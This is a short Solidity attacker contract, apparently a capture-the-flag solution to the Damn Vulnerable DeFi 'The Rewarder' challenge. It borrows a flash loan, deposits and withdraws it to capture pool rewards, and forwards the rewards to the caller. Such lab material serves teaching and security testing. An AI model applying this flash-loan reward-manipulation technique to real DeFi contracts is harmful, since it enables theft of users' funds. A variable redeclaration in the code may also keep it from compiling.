pragma solidity 0.8.16;

import "./TheRewarderPool.sol";
import "./FlashLoanerPool.sol";
import "../DamnValuableToken.sol";

contract TheRewarderAttacker {
    TheRewarderPool private immutable rewarderPool;

    constructor(address target) {
        rewarderPool = TheRewarderPool(target);
    }

    function attack(address flashLoan, address rewardToken) external {
        RewardToken rewardToken = RewardToken(rewardToken);
        FlashLoanerPool(flashLoan).flashLoan(1000000e18);
        rewardToken.transfer(msg.sender, rewardToken.balanceOf(address(this)));
    }

    function receiveFlashLoan(uint256 amount) external {
        DamnValuableToken token = FlashLoanerPool(msg.sender).liquidityToken();
        token.approve(address(rewarderPool), amount);
        rewarderPool.deposit(amount);
        rewarderPool.withdraw(amount);
        token.transfer(msg.sender, amount);
    }
}